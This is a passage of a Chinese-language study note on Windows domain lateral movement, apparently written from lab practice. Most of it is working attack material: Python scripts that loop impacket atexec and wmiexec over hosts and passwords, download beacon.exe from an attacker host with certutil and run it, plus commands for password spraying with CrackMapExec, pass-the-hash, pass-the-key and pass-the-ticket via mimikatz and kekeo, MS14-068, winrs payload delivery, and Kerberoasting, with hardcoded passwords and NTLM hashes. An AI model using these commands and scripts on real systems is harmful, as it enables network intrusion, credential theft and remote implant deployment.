    <span class="hljs-string">&apos;admin!@#45&apos;</span>
}


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">xz</span><span class="hljs-params">()</span>:</span><span class="hljs-comment">#&#x4E0B;&#x8F7D;&#x540E;&#x95E8;</span>
    <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> ips:
        <span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> users:
            <span class="hljs-keyword">for</span> mima <span class="hljs-keyword">in</span> passs:
                exec1=<span class="hljs-string">&apos;D:\Myproject\\venv\Scripts\python.exe D:\Myproject\impacket-master\examples\\atexec.py ./administrator:&apos;</span>+mima+<span class="hljs-string">&apos;@&apos;</span>+ip+<span class="hljs-string">&apos; &quot;certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe&quot;&apos;</span>
                exec2=<span class="hljs-string">&apos;D:\Myproject\\venv\Scripts\python.exe D:\Myproject\impacket-master\examples\\atexec.py god/&apos;</span>+user+<span class="hljs-string">&apos;:&apos;</span>+mima+<span class="hljs-string">&apos;@&apos;</span>+ip+<span class="hljs-string">&apos; &quot;certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe&quot;&apos;</span>
                <span class="hljs-comment">#exec3=&apos;atexec.exe ./administrator:admin!@#45@192.168.3.32 &quot;certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe&quot;&apos;</span>
                print(<span class="hljs-string">&apos;---&gt;&apos;</span>+exec1+<span class="hljs-string">&apos;&lt;---&apos;</span>)
                print(<span class="hljs-string">&apos;---&gt;&apos;</span> + exec2 + <span class="hljs-string">&apos;&lt;---&apos;</span>)
                os.system(exec1)
                os.system(exec2)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">zx</span><span class="hljs-params">()</span>:</span><span class="hljs-comment">#&#x6267;&#x884C;&#x540E;&#x95E8;</span>
    <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> ips:
        <span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> users:
            <span class="hljs-keyword">for</span> mima <span class="hljs-keyword">in</span> passs:
                <span class="hljs-comment">#exec=&quot;net use \\&quot;+ &quot;\\&quot;+ip+&apos;\ipc$ &apos;+mima+&apos; /user:god\\&apos;+user</span>
                exec1 = <span class="hljs-string">&apos;D:\Myproject\\venv\Scripts\python.exe D:\Myproject\impacket-master\examples\\atexec.py ./administrator:&apos;</span> + mima + <span class="hljs-string">&apos;@&apos;</span> + ip + <span class="hljs-string">&apos; &quot;c:/beacon.exe&quot;&apos;</span>
                exec2 = <span class="hljs-string">&apos;D:\Myproject\\venv\Scripts\python.exe D:\Myproject\impacket-master\examples\\atexec.py god/&apos;</span> + user + <span class="hljs-string">&apos;:&apos;</span> + mima + <span class="hljs-string">&apos;@&apos;</span> + ip + <span class="hljs-string">&apos; &quot;c:/beacon.exe&quot;&apos;</span>
                <span class="hljs-comment">#exec3=&apos;atexec.exe ./administrator:admin!@#45@192.168.3.32 &quot;certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe&quot;&apos;</span>
                print(<span class="hljs-string">&apos;---&gt;&apos;</span> + exec1 + <span class="hljs-string">&apos;&lt;---&apos;</span>)
                print(<span class="hljs-string">&apos;---&gt;&apos;</span> + exec2 + <span class="hljs-string">&apos;&lt;---&apos;</span>)
                os.system(exec1)
                os.system(exec2)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
    xz()
    zx()
</code></pre>
<h4 id="wmi">WMI</h4>
<p>135&#x7AEF;&#x53E3;</p>
<pre><code>// 1.&#x5355;&#x6267;&#x884C;:&#x4E0D;&#x652F;&#x6301;hash
wmic /node:192.168.52.38 /user:administrator /password:admin!@45 process call create &quot;cmd.exe /c certutil -urlcache -split -f http://xxxx/shell.exe&quot;

// 2.&#x53CD;&#x5F39;shell&#x5F62;&#x5F0F;&#xFF0C;cs&#x65E0;&#x6CD5;&#x5229;&#x7528;
cscript //nologo wmiexec.vbs /shell 192.168.52.138 administrator A@2019gaokaowar
</code></pre><p>wmiexec.vbs&#x653E;&#x5728;&#x4E0A;&#x9762;&#x6267;&#x884C;&#x5C31;&#x53EF;&#x4EE5;&#x4E86;</p>
<p><a href="https://imgse.com/i/p9Svkkj" target="_blank"><img src="https://s1.ax1x.com/2023/04/15/p9Svkkj.png" alt="p9Svkkj.png"></a></p>
<p><a href="https://imgse.com/i/p9SvAts" target="_blank"><img src="https://s1.ax1x.com/2023/04/15/p9SvAts.png" alt="p9SvAts.png"></a></p>
<pre><code>// 3.&#x5229;&#x7528;impacket&#x5957;&#x4EF6;
wmiexec ./administrator:A@2019gaokaowar@192.168.52.138 &quot;whoami&quot;
wmiexec -hashes:xxxxxxxxxxxxxxxx ./administrator@192.168.52.138 &quot;whoami&quot;
// &#x4E0B;&#x8F7D;&#x540E;&#x95E8;&#xFF0C;&#x5E76;&#x6267;&#x884C;
wmiexec ./administrator:A@2019gaokaowar@192.168.52.138 &quot;certutil -urlcache -split -f http://192.168.52.143/4444.exe c:/beacon.exe&quot;

wmiexec ./administrator:A@2019gaokaowar@192.168.52.138 &quot;c:/beacon.exe&quot;
</code></pre><p><a href="https://imgse.com/i/p9SxpCR" target="_blank"><img src="https://s1.ax1x.com/2023/04/15/p9SxpCR.png" alt="p9SxpCR.png"></a></p>
<p><a href="https://imgse.com/i/p9Sxdx0" target="_blank"><img src="https://s1.ax1x.com/2023/04/15/p9Sxdx0.png" alt="p9Sxdx0.png"></a></p>
<h4 id="smb">SMB</h4>
<pre><code>// 1.psexec
psexec64 \\192.168.52.138 -u administrator -p A@2019gaokaowar -s cmd
// impacket&#x5957;&#x4EF6;&#x5185;&#x7684;
psexec -hashes:xxxxxxxxxxxxxxxxxx ./administrator@192.168.52.138
</code></pre><p><a href="https://imgse.com/i/p9Szjh9" target="_blank"><img src="https://s1.ax1x.com/2023/04/15/p9Szjh9.png" alt="p9Szjh9.png"></a></p>
<pre><code>// 2.smbexec
smbexec ./administrator:A@2019gaokaowar@192.168.52.138
smbexec god/administrator:A@2019gaokaowar@192.168.52.138

smbexec -hashes: xxxxxxxxxxxxxxxxxxx ./administrator@192.168.52.138
smbexec -hashes: xxxxxxxxxxxxxxxxxxx god/administrator@192.168.52.138

// 3.services&#xFF08;&#x5355;&#x6267;&#x884C;&#xFF09;
services -hashes : xxxxxxxxxxxxxxxxxxxxx ./administrator:@192.168.52.138 create -name shell -display shellexec -path c:windows\system32\shell.exe
</code></pre><p>python&#x811A;&#x672C;</p>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> os

ips=[<span class="hljs-string">&apos;192.168.3.21&apos;</span>,<span class="hljs-string">&apos;192.168.3.25&apos;</span>,<span class="hljs-string">&apos;192.168.3.29&apos;</span>,<span class="hljs-string">&apos;192.168.3.28&apos;</span>,<span class="hljs-string">&apos;192.168.3.30&apos;</span>,<span class="hljs-string">&apos;192.168.3.32&apos;</span>]

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">down</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> ips:
        wmi_exec=<span class="hljs-string">&apos;D:\Myproject\\venv\Scripts\python.exe D:\Myproject\impacket-master\examples\\wmiexec.py ./administrator:admin!@#45@%s &quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/4455.exe c:/4455.exe&quot;&apos;</span>%ip
        print(wmi_exec)
        os.system(wmi_exec)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">zx</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> ips:
        wmi_exec=<span class="hljs-string">&apos;D:\Myproject\\venv\Scripts\python.exe D:\Myproject\impacket-master\examples\\wmiexec.py ./administrator:admin!@#45@%s &quot;c:/4455.exe&quot;&apos;</span>%ip
        print(wmi_exec)
        os.system(wmi_exec)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
    down()
    zx()
</code></pre>
<h5 id="crackmapexec">CrackMapExec</h5>
<p>&#x524D;&#x63D0;&#xFF0C;30394&#xFF0C;&#x5148;&#x5728;&#x4F60;&#x7684;cs&#x4E0A;&#x5F00;&#x4E00;&#x4E2A;sock4&#x4EE3;&#x7406;&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x8FD9;&#x4E2A;&#x7AEF;&#x53E3;&#x53F7;&#x8BB0;&#x4F4F;&#xFF0C;&#x5728;proxychains&#x4E0A;&#x4FEE;&#x6539;&#x7ED1;&#x5B9A;</p>
<pre><code>linux + proxychains + CrackMapExec
</code></pre><p>proxychains&#x7684;&#x5B89;&#x88C5;</p>
<pre><code>sudo apt-get install proxychains
vim /etc/proxychains.conf
</code></pre><p>CrackMapExec&#x5B89;&#x88C5;</p>
<p><a href="https://www.freebuf.com/sectool/184573.html" target="_blank">https://www.freebuf.com/sectool/184573.html</a></p>
<pre><code>apt-get install -y libssl-dev libffi-dev python-dev build-essential
pip install crackmapexec
</code></pre><pre><code>// &#x5BC6;&#x7801;&#x55B7;&#x6D12;-&#x57DF;(&#x660E;&#x6587;)
proxychains4 cme smb 192.168.52.1-255 -u administrator -p &apos;A@2019gaokaowar&apos;
// &#x5BC6;&#x7801;&#x55B7;&#x6D12;-&#x672C;&#x5730;
proxychains4 cme smb 192.168.52.1-255 -u administrator -p &apos;A@2019gaokaowar&apos; --local-auth

//&#x5BC6;&#x7801;&#x55B7;&#x6D12;-hash
proxychains python cme smb 192.168.52.1-255 -u administrator -h &apos;zxxxxxxxxxxxxx&apos;

e45e329feb5d925b
a3f549b17b4b3dde

//&#x5BC6;&#x7801;&#x55B7;&#x6D12;-&#x5C06;&#x5BC6;&#x7801;&#x653E;&#x5728;p.txt&#x4E2D;&#xFF0C;&#x7528;&#x6237;&#x540D;&#x653E;&#x5728;u.txt&#x4E2D;,ip&#x653E;&#x5728;i.txt
proxychains4 cme smb 192.168.52.138 -u u.txt -p p.txt -x &quot;certutil -urlcache -split -f http://192.168.52.143/6666.exe c:/6666.exe &amp; 6666.exe&quot;
</code></pre><p>&#x5229;&#x7528;&#x55B7;&#x6D12;&#x4E0A;&#x7EBF;</p>
<p><a href="https://imgse.com/i/p9pAXNV" target="_blank"><img src="https://s1.ax1x.com/2023/04/15/p9pAXNV.png" alt="p9pAXNV.png"></a><a href="https://imgse.com/i/p9pAjhT" target="_blank"><img src="https://s1.ax1x.com/2023/04/15/p9pAjhT.png" alt="p9pAjhT.png"></a></p>
<h4 id="pth">PTH</h4>
<p>&#x5728;2012 R2&#x4E4B;&#x524D;&#x662F;</p>
<pre><code>pass the hash
lm ntlm  NTLM&#x8BA4;&#x8BC1;&#x653B;&#x51FB;
// mimikatz
mimikatz privilege:debug
mimikatz sekurlsa::pth /user:administrator /domain:192.168.52.141 /ntlm:069f3f91c44c631880d58af546516f45

mimikatz sekurlsa::pth /user:liukaifeng01 /domain:192.168.52.138 /ntlm:069f3f91c44c631880d58af546516f45



dir \\192.168.52.138\C$
copy batman-batman.exe \\192.168.52.138\c$

sc \\owa create bsshell binpath= &quot;c:\batman-batman.exe&quot;
sc \\owa start bsshell


psexec -hashes :NTLM&#x503C; &#x57DF;&#x540D;/&#x57DF;&#x7528;&#x6237;@&#x57DF;&#x5185;ip&#x5730;&#x5740;
smbexec -hashes :NTLM&#x503C; &#x57DF;&#x540D;/&#x57DF;&#x7528;&#x6237;@&#x57DF;&#x5185;ip&#x5730;&#x5740;
wmiexec -hashes :NTLM&#x503C; &#x57DF;&#x540D;/&#x57DF;&#x7528;&#x6237;@&#x57DF;&#x5185;ip&#x5730;&#x5740;
python psexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32
python smbexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32
python wmiexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32
</code></pre><pre><code class="lang-python"><span class="hljs-comment"># &#x5982;&#x4E0B;&#xFF0C;&#x5229;&#x7528;psexec&#x8FDB;&#x884C;pth&#x6A2A;&#x5411;&#x79FB;&#x52A8;&#x62FF;&#x5230;&#x57DF;&#x63A7;</span>
python psexec.py -hashes :<span class="hljs-number">069</span>f3f91c44c631880d58af546516f45 god/administrator@<span class="hljs-number">192.168</span><span class="hljs-number">.52</span><span class="hljs-number">.138</span>
</code></pre>
<p><a href="https://imgse.com/i/p99yC8I" target="_blank"><img src="https://s1.ax1x.com/2023/04/16/p99yC8I.png" alt="p99yC8I.png"></a></p>
<pre><code class="lang-python"><span class="hljs-comment"># &#x5229;&#x7528;smb&#x6A2A;&#x5411;&#x79FB;&#x52A8;</span>
python smbexec.py -hashes :<span class="hljs-number">069</span>f3f91c44c631880d58af546516f45 god/administrator@<span class="hljs-number">192.168</span><span class="hljs-number">.52</span><span class="hljs-number">.138</span>
</code></pre>
<p><img src="C:\Users\batma\AppData\Roaming\Typora\typora-user-images\image-20230416135647101.png" alt="image-20230416135647101"></p>
<h4 id="ptk">PTK</h4>
<pre><code>pass the key
ekeys 256 NTLM&#x8BA4;&#x8BC1;&#x653B;&#x51FB;

#&#x57DF;&#x6A2A;&#x5411;&#x79FB;&#x52A8;-PTK-Mimikatz&amp;AES256
PTK = Pass The Key&#xFF0C;&#x5F53;&#x7CFB;&#x7EDF;&#x5B89;&#x88C5;&#x4E86;KB2871997&#x8865;&#x4E01;&#x4E14;&#x7981;&#x7528;&#x4E86;NTLM&#x7684;&#x65F6;&#x5019;&#xFF0C;
&#x90A3;&#x6211;&#x4EEC;&#x6293;&#x53D6;&#x5230;&#x7684;ntlm hash&#x4E5F;&#x5C31;&#x5931;&#x53BB;&#x4E86;&#x4F5C;&#x7528;&#xFF0C;&#x4F46;&#x662F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;PTK&#x7684;&#x653B;&#x51FB;&#x65B9;&#x5F0F;&#x83B7;&#x5F97;&#x6743;&#x9650;&#x3002;
mimikatz sekurlsa::ekeys
mimikatz sekurlsa::pth /user:&#x57DF;&#x7528;&#x6237;&#x540D; /domain:&#x57DF;&#x540D; /aes256:aes256&#x503C;
</code></pre><h4 id="ptt">PTT</h4>
<pre><code>//1.&#x5229;&#x7528;ms14-068.exe  &#x8FD9;&#x662F;&#x6F0F;&#x6D1E;&#xFF0C;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x7968;&#x636E;&#x63D0;&#x5347;&#x5230;&#x57DF;&#x63A7;&#x7BA1;&#x7406;&#x5458;&#x6743;&#x9650;
pass the ticket
&#x5229;&#x7528;&#x7968;&#x636E;&#x51ED;&#x8BC1;TGT&#x8FDB;&#x884C;&#x6E17;&#x900F;-&#x57FA;&#x4E8E;Kerberos&#x8BA4;&#x8BC1;&#x653B;&#x51FB;
//&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x7528;&#x6237;&#x7684;SID&#x503C;  S-1-5-21-2952760202-1353902439-2381784089-500
shell whoami/user
//&#x5229;&#x7528;&#x751F;&#x6210;&#x7968;&#x636E;&#x6587;&#x4EF6;,&#x5982;&#x56FE;
MS14-068.exe -u administrator@god.org -s S-1-5-21-2952760202-1353902439-2381784089-500 -d 192.168.52.138 -p A@2019gaokaowar
</code></pre><p><a href="https://imgse.com/i/p9960Yj" target="_blank"><img src="https://s1.ax1x.com/2023/04/16/p9960Yj.png" alt="p9960Yj.png"></a></p>
<pre><code>shell klist purge
//&#x5BFC;&#x5165;&#x7968;&#x636E;
mimikatz kerberos::ptc TGT_administrator@god.org.ccache
</code></pre><p><a href="https://imgse.com/i/p99cENQ" target="_blank"><img src="https://s1.ax1x.com/2023/04/16/p99cENQ.png" alt="p99cENQ.png"></a></p>
<pre><code>//2.&#x5229;&#x7528;kekeo(&#x9AD8;&#x6743;&#x9650;&#xFF0C;&#x9700;NTLM)-&#x5229;&#x7528;&#x83B7;&#x53D6;&#x7684;NTLM&#x751F;&#x6210;&#x65B0;&#x7684;&#x7968;&#x636E;&#x5C1D;&#x8BD5;&#x8BA4;&#x8BC1;   &#x8FD9;&#x4E0D;&#x662F;&#x6F0F;&#x6D1E;&#xFF0C;&#x53EA;&#x662F;&#x7968;&#x636E;&#x751F;&#x6210;
&#x56E0;&#x4E3A;&#x5F53;&#x524D;&#x4E3B;&#x673A;&#x80AF;&#x5B9A;&#x4E4B;&#x524D;&#x4E0E;&#x5176;&#x4ED6;&#x4E3B;&#x673A;&#x8FDE;&#x63A5;&#x8FC7;&#xFF0C;&#x6240;&#x4EE5;&#x672C;&#x5730;&#x5E94;&#x8BE5;&#x751F;&#x6210;&#x4E86;&#x4E00;&#x4E9B;&#x7968;&#x636E;&#xFF0C;
&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5BFC;&#x51FA;&#x8FD9;&#x4E9B;&#x7968;&#x636E;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x5BFC;&#x5165;&#x7968;&#x636E;&#xFF0C;&#x5229;&#x7528;&#x3002;&#x8BE5;&#x65B9;&#x6CD5;&#x7C7B;&#x4F3C;&#x4E8E;cookie&#x6B3A;&#x9A97;
&#x7F3A;&#x70B9;&#xFF1A;&#x7968;&#x636E;&#x662F;&#x6709;&#x6709;&#x6548;&#x671F;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x5982;&#x679C;&#x5F53;&#x524D;&#x4E3B;&#x673A;&#x5728;&#x8FDE;&#x63A5;&#x8FC7;&#x57DF;&#x63A7;&#x7684;&#x8BDD;&#xFF0C;&#x6709;&#x6548;&#x671F;&#x5185;&#x53EF;&#x5229;&#x7528;&#x3002;
//&#x4E0A;&#x4F20;kekeo&#x7136;&#x540E;&#x6267;&#x884C;&#xFF0C;&#x751F;&#x6210;TGT_Administrator@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi
&#x751F;&#x6210;&#x7968;&#x636E;&#xFF1A;
shell kekeo &quot;tgt::ask /user:Administrator /domain:god.org /ntlm:069f3f91c44c631880d58af546516f45&quot; &quot;exit&quot;
</code></pre><p><a href="https://imgse.com/i/p99chb8" target="_blank"><img src="https://s1.ax1x.com/2023/04/16/p99chb8.png" alt="p99chb8.png"></a></p>
<pre><code>&#x5BFC;&#x5165;&#x7968;&#x636E;&#xFF1A;shell kekeo &quot;kerberos::ptt TGT_Administrator@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi&quot; &quot;exit&quot;
&#x67E5;&#x770B;&#x7968;&#x636E;&#xFF1A;mimikatz kerberos::list   powershell klist purge
&#x5229;&#x7528;&#x7968;&#x636E;&#x8FDE;&#x63A5;&#xFF1A;shell dir \\192.168.52.138\c$
&#x6CE8;&#x610F;&#xFF1A;&#x6210;&#x529F;&#x4E0D;&#x6210;&#x529F;&#x770B;ntlm&#x54C8;&#x5E0C;&#x503C;&#x7684;&#x6B63;&#x786E;&#x6027;
</code></pre><pre><code>3&#x3001;mimikatz(&#x9AD8;&#x6743;&#x9650;,&#x9700;Ticket)-&#x5229;&#x7528;&#x5386;&#x53F2;&#x9057;&#x7559;&#x7684;&#x7968;&#x636E;&#x91CD;&#x65B0;&#x8BA4;&#x8BC1;&#x5C1D;&#x8BD5;
&#x5BFC;&#x51FA;&#x7968;&#x636E;&#xFF1A;
mimikatz sekurlsa::tickets /export
&#x5BFC;&#x5165;&#x7968;&#x636E;&#xFF1A;
mimikatz kerberos::ptt C:\Users\webadmin\Desktop\[0;22d3a]-2-1-40e00000-Administrator@krbtgt-god.org.kirbi
&#x67E5;&#x770B;&#x7968;&#x636E;&#xFF1A;shell klist
&#x5229;&#x7528;&#x7968;&#x636E;&#x8FDE;&#x63A5;&#xFF1A;shell dir \\owa2010cn-god\c$
&#x6CE8;&#x610F;&#xFF1A;&#x6210;&#x529F;&#x4E0D;&#x6210;&#x529F;&#x770B;&#x5F53;&#x524D;&#x4E3B;&#x673A;&#x6709;&#x6CA1;&#x6709;&#x88AB;&#x76EE;&#x6807;&#x8FDE;&#x63A5;&#x8FC7;



#&#x57DF;&#x6A2A;&#x5411;&#x79FB;&#x52A8;-PTH-Proxychains&amp;CrackMapExec
CrackMapExec
Github&#xFF1A;https://github.com/Porchetta-Industries/CrackMapExec
&#x5B98;&#x65B9;&#x624B;&#x518C;&#xFF1A;https://mpgn.gitbook.io/crackmapexec/
&#x90E8;&#x6848;&#x4F8B;&#xFF1A;https://www.freebuf.com/sectool/184573.html
&#x4E0B;&#x8F7D;&#x5BF9;&#x5E94;release&#xFF0C;&#x5EFA;&#x7ACB;socks&#x8FDE;&#x63A5;&#xFF0C;&#x8BBE;&#x7F6E;socks&#x4EE3;&#x7406;&#xFF0C;&#x914D;&#x7F6E;&#x89C4;&#x5219;&#xFF0C;&#x8C03;&#x7528;&#xFF01;
1&#x3001;Linux Proxychains&#x4F7F;&#x7528;
&#x4EE3;&#x7406;&#x914D;&#x7F6E;&#xFF1A;Proxychains.conf
&#x4EE3;&#x7406;&#x8C03;&#x7528;&#xFF1A;Proxychains &#x547D;&#x4EE4;
2&#x3001;&#x5BC6;&#x7801;&#x55B7;&#x5C04;-&#x57DF;&#x7528;&#x6237;&#x767B;&#x5F55;PTH&#xFF1A;
proxychains python cme smb 192.168.3.21-32 -u user.txt -H 518b98ad4178a53695dc997aa02d455c #&#x57DF;&#x7528;&#x6237;HASH&#x767B;&#x5F55;
proxychains python cme smb 192.168.3.21-32 -u administrator -H 518b98ad4178a53695dc997aa02d455c --local-auth #&#x672C;&#x5730;&#x7528;&#x6237;HASH&#x767B;&#x5F55;
</code></pre><h4 id="rdp">RDP</h4>
<pre><code>&#x660E;&#x6587;&#x8FDE;&#x63A5;&#xFF1A;
mstsc /console /v:192.168.3.32 /admin
HASH&#x8FDE;&#x63A5;&#xFF1A;
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:administrator /domain:192.168.52.143 /ntlm:069f3f91c44c631880d58af546516f45 &quot;/run:mstsc /restrictedadmin&quot;
</code></pre><h4 id="winrm">WINRM</h4>
<pre><code>RM&#x670D;&#x52A1;
RS&#x547D;&#x4EE4;

Windows 2008 &#x4EE5;&#x4E0A;&#x7248;&#x672C;&#x9ED8;&#x8BA4;&#x81EA;&#x52A8;&#x72B6;&#x6001;&#xFF0C;Windows Vista/win7&#x4E0A;&#x5FC5;&#x987B;&#x624B;&#x52A8;&#x542F;&#x52A8;&#xFF1B;
Windows 2012&#x4E4B;&#x540E;&#x7684;&#x7248;&#x672C;&#x9ED8;&#x8BA4;&#x5141;&#x8BB8;&#x8FDC;&#x7A0B;&#x4EFB;&#x610F;&#x4E3B;&#x673A;&#x6765;&#x7BA1;&#x7406;

&#x653B;&#x51FB;&#x673A;&#x5F00;&#x542F;&#xFF1A;
winrm quickconfig -q
winrm set winrm/config/Client @{TrustedHosts=&quot;*&quot;}
1.&#x63A2;&#x9488;&#x53EF;&#x7528;&#xFF1A;
cs &#x5185;&#x7F6E;&#x7AEF;&#x53E3;&#x626B;&#x63CF;5985
powershell Get-WmiObject -Class win32_service | Where-Object {$_.name -like &quot;WinRM&quot;}
2.&#x8FDE;&#x63A5;&#x6267;&#x884C;&#xFF1A;
winrs -r:192.168.52.138 -u:god\administrator -p:A@2019gaokaowar whoami
winrs -r:192.168.3.21 -u:192.168.3.21\administrator -p:Admin12345 whoami
3.&#x4E0A;&#x7EBF;CS&amp;MSF:
winrs -r:192.168.3.32 -u:192.168.3.32\administrator -p:admin!@#45 &quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/beacon.exe beacon.exe &amp; beacon.exe&quot;
</code></pre><p><a href="https://imgse.com/i/p9942FK" target="_blank"><img src="https://s1.ax1x.com/2023/04/16/p9942FK.png" alt="p9942FK.png"></a></p>
<h4 id="spn&#x626B;&#x63CF;&#xFF08;&#x975E;&#x6A2A;&#x5411;&#x79FB;&#x52A8;&#xFF09;">SPN&#x626B;&#x63CF;&#xFF08;&#x975E;&#x6A2A;&#x5411;&#x79FB;&#x52A8;&#xFF09;</h4>
<pre><code>1.&#x626B;&#x63CF;&#xFF1A;
powershell setspn -T god.org -q */*
powershell setspn -T god.org -q */* | findstr &quot;MSSQL&quot;
2.&#x68C0;&#x6D4B;&#xFF1A;
Rubeus kerberoast
3.&#x8BF7;&#x6C42;&#xFF1A;&#xFF08;&#x8981;&#x4EA7;&#x751F;&#x7968;&#x636E;&#x6587;&#x4EF6;&#xFF09;
powershell Add-Type -AssemblyName System.IdentityModel
powershell New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/owa.god.org:1433&quot;
mimikatz kerberos::ask /target:MSSQLSvc/SqlServer.god.org:1433
4.&#x5BFC;&#x51FA;&#xFF1A;
mimikatz kerberos::list /export
5.&#x7834;&#x89E3;&#xFF1A;
python tgsrepcrack.py pass.txt &quot;1-40a00000-jack@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi&quot;
5.&#x91CD;&#x5199;&#xFF1A;
https://www.freebuf.com/articles/system/174967.html
</code></pre><h4 id="kerberoasting">Kerberoasting</h4>
<pre><code>&#x76EE;&#x7684;&#xFF1A;&#x5728;&#x65E0;&#x6CD5;&#x5F97;&#x5230;&#x660E;&#x6587;&#x548C;ntlm hash&#x65F6;&#xFF0C;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#xFF0C;&#x5148;spn&#x626B;&#x63CF;&#x57DF;&#x5185;&#x5B58;&#x5728;&#x7684;&#x670D;&#x52A1;&#xFF0C;&#x627E;&#x5230;&#x7528;rc4&#x52A0;&#x5BC6;&#x7684;&#x7968;&#x636E;&#xFF0C;&#x548C;&#x8FD9;&#x4E2A;&#x670D;&#x52A1;&#x5EFA;&#x7ACB;&#x8FDE;&#x63A5;&#xFF0C;&#x67E5;&#x770B;&#x5EFA;&#x7ACB;&#x8FDE;&#x63A5;&#x540E;&#x7684;&#x7968;&#x636E;&#xFF0C;&#x8FDB;&#x884C;&#x5BFC;&#x51FA;&#xFF0C;&#x5229;&#x7528;&#x5DE5;&#x5177;&#x5BF9;&#x8FD9;&#x4E2A;&#x7968;&#x636E;&#x8FDB;&#x884C;&#x7206;&#x7834;&#xFF0C;&#x5F97;&#x5230;&#x5BC6;&#x7801;&#xFF0C;&#x518D;&#x628A;&#x8FD9;&#x4E2A;&#x5BC6;&#x7801;&#x5C1D;&#x8BD5;&#x8FDB;&#x884C;&#x5176;&#x4ED6;&#x6A2A;&#x5411;&#x79FB;&#x52A8;
</code></pre><pre><code>Kerberos-&#x8BF7;&#x6C42;&amp;&#x7834;&#x89E3;&amp;&#x91CD;&#x5199;
Kerberoasting &#x653B;&#x51FB;&#x7684;&#x5229;&#x7528;&#xFF1A;
&#x2022;SPN&#x670D;&#x52A1;&#x53D1;&#x73B0;
&#x2022;&#x8BF7;&#x6C42;&#x670D;&#x52A1;&#x7968;&#x636E;
&#x2022;&#x670D;&#x52A1;&#x7968;&#x636E;&#x7684;&#x5BFC;&#x51FA;
&#x2022;&#x670D;&#x52A1;&#x7968;&#x636E;&#x7684;&#x66B4;&#x529B;&#x7834;&#x89E3;
https://github.com/GhostPack/Rubeus
https://github.com/nidem/kerberoast
https://www.freebuf.com/articles/system/174967.html
&#x5982;&#x9700;&#x5229;&#x7528;&#x9700;&#x8981;&#x914D;&#x7F6E;&#x7B56;&#x7565;&#x52A0;&#x5BC6;&#x65B9;&#x5F0F;(&#x5BF9;&#x6BD4;)
&#x9ED1;&#x5BA2;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x6709;&#x6548;&#x7684;&#x57DF;&#x7528;&#x6237;&#x7684;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x7968;&#x8BC1;&#xFF08;TGT&#xFF09;&#x53BB;&#x8BF7;&#x6C42;&#x8FD0;&#x884C;&#x5728;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;&#x4E00;&#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x76EE;&#x6807;&#x670D;&#x52A1;&#x7684;&#x670D;&#x52A1;&#x7968;&#x8BC1;&#x3002;
DC&#x5728;&#x6D3B;&#x52A8;&#x76EE;&#x5F55;&#x4E2D;&#x67E5;&#x627E;SPN&#xFF0C;&#x5E76;&#x4F7F;&#x7528;&#x4E0E;SPN&#x5173;&#x8054;&#x7684;&#x670D;&#x52A1;&#x5E10;&#x6237;&#x52A0;&#x5BC6;&#x7968;&#x8BC1;&#xFF0C;&#x4EE5;&#x4FBF;&#x670D;&#x52A1;&#x80FD;&#x591F;&#x9A8C;&#x8BC1;&#x7528;&#x6237;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x3002;
&#x8BF7;&#x6C42;&#x7684;Kerberos&#x670D;&#x52A1;&#x7968;&#x8BC1;&#x7684;&#x52A0;&#x5BC6;&#x7C7B;&#x578B;&#x662F;RC4_HMAC_MD5&#xFF0C;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x670D;&#x52A1;&#x5E10;&#x6237;&#x7684;NTLM&#x5BC6;&#x7801;&#x54C8;&#x5E0C;&#x7528;&#x4E8E;&#x52A0;&#x5BC6;&#x670D;&#x52A1;&#x7968;&#x8BC1;&#x3002;
